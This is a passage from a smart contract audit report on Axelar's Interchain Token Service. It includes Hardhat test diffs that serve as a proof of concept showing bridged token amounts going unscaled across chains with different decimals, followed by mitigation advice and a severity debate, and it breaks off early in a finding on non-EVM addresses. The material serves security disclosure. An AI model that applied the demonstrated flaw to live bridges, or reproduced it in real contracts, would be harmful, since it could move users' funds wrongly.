class=\"mtk8\">-                .withArgs(tokenId, name, symbol, decimals, &#39;0x&#39;, wallet.address, otherChains[1], gasValues[1])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(tokenId, name, symbol, otherDecimals, &#39;0x&#39;, wallet.address, otherChains[1], gasValues[1])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gasService, &#39;NativeGasPaidForContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .withArgs(service.address, otherChains[1], service.address.toLowerCase(), keccak256(payload), gasValues[1], wallet.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gateway, &#39;ContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -217,30 +218,32 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         it(&#39;Should send some token to another chain&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            const amount = 1234;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            const amountSrc = BigInt(1234e18); // same amount on source and destination chain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            const amountDst = BigInt(1234e16); // just scaled according to decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const destAddress = &#39;0x1234&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const destChain = otherChains[0];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const gasValue = 6789;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payload = defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 [&#39;uint256&#39;, &#39;bytes32&#39;, &#39;bytes&#39;, &#39;uint256&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amountDst], // expect scaled amount according to remote decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payloadHash = keccak256(payload);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            await expect(token.approve(tokenManager.address, amount))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            await expect(token.approve(tokenManager.address, amountSrc))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .to.emit(token, &#39;Approval&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(wallet.address, tokenManager.address, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            await expect(tokenManager.sendToken(destChain, destAddress, amount, &#39;0x&#39;, { value: gasValue }))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(wallet.address, tokenManager.address, amountSrc);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // call succeeds but doesn&#39;t take into account remote decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            await expect(tokenManager.sendToken(destChain, destAddress, amountSrc, &#39;0x&#39;, { value: gasValue }))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(token, &#39;Transfer&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(wallet.address, tokenManager.address, amount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(wallet.address, tokenManager.address, amountSrc)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gateway, &#39;ContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(service.address, destChain, service.address.toLowerCase(), payloadHash, payload)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(service.address, destChain, service.address.toLowerCase(), payloadHash, payload) // should fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gasService, &#39;NativeGasPaidForContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(service.address, destChain, service.address.toLowerCase(), payloadHash, gasValue, wallet.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(service.address, destChain, service.address.toLowerCase(), payloadHash, gasValue, wallet.address) // should fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .to.emit(service, &#39;TokenSent&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(tokenId, destChain, destAddress, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(tokenId, destChain, destAddress, amountDst); // should fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // For this test the token must be a standardized token (or a distributable token in general)</span></span></span></code></pre>\n<p>The second part of the PoC demonstrates that the aforementioned payload is relayed/approved as it is to the remote chain and the source token amount is received on the remote chain irrespective of the remote token’s decimals.</p>\n<p>Just apply the <em>diff</em> below and run the test with <code>npm run test test/its/tokenService.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/its/tokenService.js b/test/its/tokenService.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index f9843c1..161ac8a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/its/tokenService.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/its/tokenService.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -797,10 +797,10 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    describe(&#39;Receive Remote Tokens&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    describe.only(&#39;Receive Remote Tokens&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const sourceChain = &#39;source chain&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         let sourceAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        const amount = 1234;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        const amount = 1234; // this unscaled source amount gets processed with respect to remote decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         let destAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         before(async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             sourceAddress = service.address.toLowerCase();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -813,7 +813,7 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payload = defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 [&#39;uint256&#39;, &#39;bytes32&#39;, &#39;bytes&#39;, &#39;uint256&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount], // amount should have been scaled according to remote decimals before relaying</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const commandId = await approveContractCall(gateway, sourceChain, sourceAddress, service.address, payload);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -825,11 +825,11 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         it(&#39;Should be able to receive mint/burn token&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            const [token, , tokenId] = await deployFunctions.mintBurn(`Test Token Mint Burn`, &#39;TT&#39;, 12, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            const [token, , tokenId] = await deployFunctions.mintBurn(`Test Token Mint Burn`, &#39;TT&#39;, 14, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payload = defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 [&#39;uint256&#39;, &#39;bytes32&#39;, &#39;bytes&#39;, &#39;uint256&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount], // amount should have been scaled according to remote decimals before relaying</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const commandId = await approveContractCall(gateway, sourceChain, sourceAddress, service.address, payload);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -841,11 +841,11 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         it(&#39;Should be able to receive liquidity pool token&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            const [token, , tokenId] = await deployFunctions.liquidityPool(`Test Token Liquidity Pool`, &#39;TTLP&#39;, 12, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            const [token, , tokenId] = await deployFunctions.liquidityPool(`Test Token Liquidity Pool`, &#39;TTLP&#39;, 16, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             (await await token.transfer(liquidityPool.address, amount)).wait();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payload = defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 [&#39;uint256&#39;, &#39;bytes32&#39;, &#39;bytes&#39;, &#39;uint256&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                [SELECTOR_SEND_TOKEN, tokenId, destAddress, amount], // amount should have been scaled according to remote decimals before relaying</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const commandId = await approveContractCall(gateway, sourceChain, sourceAddress, service.address, payload);</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This issue cannot be solved easily since the remote chain doesn’t know about the token decimals on the source chain and vice versa. I suggest the following options:</p>\n<ol>\n<li>Explicitly exclude tokens with different decimals on different chains and emphasize this in the documentation. However, this would be a loss of opportunity and against the mantra “Axelar is a decentralized interoperability network connecting all blockchains, assets and apps through a universal set of protocols and APIs.”</li>\n<li>Normalize all bridged token amounts to e.g. 18 decimals (beware of loss of precision) before creating the aforementioned payload and the respective <code>ContractCall</code>/<code>TokenSent</code> events at all instances. De-normalize token amounts on the remote chain accordingly.</li>\n</ol>\n<h3 id=\"assessed-type-7\" style=\"position:relative;\"><a href=\"#assessed-type-7\" aria-label=\"assessed type 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Decimal</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1694543891\">deanamiel (Axelar) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Corrected Severity: QA</p>\n<p>We might account for this if a better approach is found than rounding off decimals. For pre-existing tokens with different decimals, a wrapper can be made by the deployer that does the decimal handling, which is the current intended use for such tokens.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1706289287\">berndartmueller (judge) decreased severity to QA and commented</a>:</strong></p>\n<blockquote>\n<p>This is a very well-written submission!</p>\n<p>However, I agree with the sponsor that wrapper tokens are supposed to be used in case of different decimals across chains. For instance, see the wrapper ERC-20 token for USDC on BNB chain, <code>Axelar Wrapped USDC (axlUSDC)</code>, <a href=\"https://bscscan.com/address/0x4268B8F0B87b6Eae5d897996E6b845ddbD99Adf3#readContract\">https://bscscan.com/address/0x4268B8F0B87b6Eae5d897996E6b845ddbD99Adf3#readContract</a>.</p>\n<p>Thus, I’m downgrading to QA (Low).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1712186032\">0xTheC0der (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@berndartmueller - Please be aware that the sponsor’s comment and severity suggestion is <strong>only</strong> about the first part of the issue (pre-existing tokens) and therefore not conclusive for the whole report.  </p>\n<ol>\n<li><em>Pre-existing tokens:</em><br>\nEven if the mentioned wrapper tokens were in scope of this audit (please correct me if I am mistaken and they are), they are not sufficiently mitigating the issue, since the codebase does not explicitly enforce their usage, nor does it require the <em>source</em> and <em>destination</em> decimals to be equal (should revert with error). Furthermore, the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/DESIGN.md#custom-bridges\">docs</a> explicitly mention the use of external ERC20 tokens but do not mention the wrappers; therefore, the issue is unmitigated as of now.<br>\nAs a result, pre-existing tokens, as well as potentially wrong wrappers with <em>different decimals on different chains</em>, can be used and subsequently lead to a loss of funds for the user or token pool.</li>\n<li><em><code>StandardizedToken</code></em> (not mentioned by the sponsor):<br>\nThe Axelar network allows to deploy and register <code>StandardizedToken</code> with the <strong>same</strong> <code>TokenId</code> but <em>different decimals on different chains</em>, see first part of PoC about (remote) deployment and <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L206-L215\">InterchainTokenService.getCustomTokenId(…)</a>.\nThis should not be possible in the first place as long as the transfer amount does not get scaled according to decimals automatically, i.e. it’s a bug which is even more severe than the above issue also leading to loss of funds.<br>\nBoth, the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L378-L402\">InterchainTokenService.deployAndRegisterStandardizedToken(…)</a> method as well as the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L404-L429\">InterchainTokenService.deployAndRegisterRemoteStandardizedToken(…)</a> method are lacking underlying checks to ensure that there is no other token with the <strong>same</strong> <code>TokenId</code> but <strong>different</strong> decimals already registered on another chain.  </li>\n</ol>\n<p>I am looking forward to more fact-based opinions about this and fair judgment considering the proven impacts, see also second part of PoC that demonstrates a loss of funds (wrong transfer of funds by factor 100).  </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1713570656\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@0xTheC0der - According to the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/DESIGN.md#architecture\">Interchain token service docs</a>, there are two types of bridges:</p>\n<ol>\n<li>Canonical bridges</li>\n<li>Custom bridges</li>\n</ol>\n<p><em>Canonical bridges</em> are used to enable bridging pre-existing ERC-20 tokens across chains. Such bridges are deployed via <code>InterchainTokenService.registerCanonicalToken</code> on the source chain and <code>InterchainTokenService.deployRemoteCanonicalToken</code> for the remote (destination) chains. Here, the trust assumption is that anyone can create canonical bridges - the resulting <code>StandardizedToken</code> on the remote chains will have matching decimals with the pre-existing ERC-20 token (see <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L334\">InterchainTokenService.sol#L334</a>. Thus, there is no such issue with non-matching decimals for canonical bridges.</p>\n<p>In regards to <em>custom bridges</em>, the trust assumption is different (<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/DESIGN.md#custom-bridges\">docs</a>):</p>\n<blockquote>\n<p>Users using Custom Bridges <strong>need to trust the deployers</strong> as they could easily confiscate the funds of users if they wanted to, same as any ERC20 distributor could confiscate the funds of users.</p>\n</blockquote>\n<p>In the submission’s PoC, the described issue is demonstrated by deploying a <code>StandardizedToken</code> with 18 decimals on the source chain and deploying corresponding <code>StandardizedToken</code> tokens with 16 decimals on remote chains (via <code>deployAndRegisterRemoteStandardizedToken</code>. In this case, it truly shows a mismatch of token decimals between the source and remote chain, leading to a loss of bridged funds.</p>\n<p>Even though the docs mention that the deployer of such a custom bridge has to be trusted, implementing the warden’s second mitigation recommendation (normalizing token transfer amounts to, e.g., 18 decimals) certainly helps mitigate this issue and reduces the surface for potential errors (malicious or non-malicious) when deploying custom bridges. For example, the Wormhole bridge does this as well by <a href=\"https://github.com/wormhole-foundation/wormhole/blob/44c8146c3f3d16db8a98214aaa7226f3cee5fb08/cosmwasm/contracts/token-bridge/src/contract.rs#L1215-L1223\">normalizing the token transfer amounts to 8 decimals</a>.</p>\n<p>Ultimately, this leads me to acknowledge the outlined issue and medium severity chosen by the warden.</p>\n<p>I kindly invite the sponsor’s feedback before changing the severity back to medium - @deanamiel.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1715258392\">berndartmueller (judge) increased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1715969297\">deanamiel (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>The standardized token scenario would still not lead to a loss of funds. One could still bridge tokens back and get the same amount, the amounts seen would be mismatched (when divided by 10^ decimals) but this is only a cosmetic issue. We still believe this is a QA level issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1716045219\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Loss of funds may not be permanent, indeed. Still, it presents an issue for users bridging <code>StandardizedToken</code> tokens and the token pools themselves. Such tokens with mismatching decimals on the source- and destination chains can also be purposefully bridged to steal funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52#issuecomment-1801833029\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>We consider this QA or Low severity. As mentioned before, there is no actual loss of funds since you can always bridge the same amount back. Furthermore, Standardized tokens still require trusting the deployer, unlike Canonical tokens. Tokens deployed and whitelisted via the UI will make sure the same decimals are used for deployments. Users are not recommended to interact with arbitrary Standardized tokens given that the deployer can still be malicious in various ways.</p>\n<p>The ERC20 <a href=\"https://eips.ethereum.org/EIPS/eip-20\">spec</a> does not require the presence of <code>name</code>, <code>symbol</code>, <code>decimals</code>. While commonly supported, these are still optional fields, so we left it flexible in the main protocol.</p>\n<p>You can also build deployer contracts on top of this that do enforce various checks such as using the on-chain name, symbol, decimals before deploying.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-interchainproposalexecutorsol-doesnt-support-non-evm-address-as-caller-or-sender\" style=\"position:relative;\"><a href=\"#m-09-interchainproposalexecutorsol-doesnt-support-non-evm-address-as-caller-or-sender\" aria-label=\"m 09 interchainproposalexecutorsol doesnt support non evm address as caller or sender permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/25\">[M-09] <code>InterchainProposalExecutor.sol</code> doesn’t support non-evm address as caller or sender</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/25\">T1MOH</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/443\">Chom</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/149\">UniversalCrypto</a></em></p>\n<p>Axelar is supposed to support different chains, not only EVM. And these chains can have a different address standard like Polkadot or Tron. These addresses can’t be whitelisted in <code>InterchainProposalExecutor.sol</code> to execute proposal. Thus, <code>InterchainProposalSender</code> implementation from non-EMV chain can’t interact with <code>InterchainProposalExecutor.sol</code> on the EVM chain.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here, you can see that <code>sourceAddress</code> is represented as <code>address</code>, not <code>string</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Whitelisted proposal callers. The proposal caller is the contract that calls the `InterchainProposalSender` at the source chain.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span 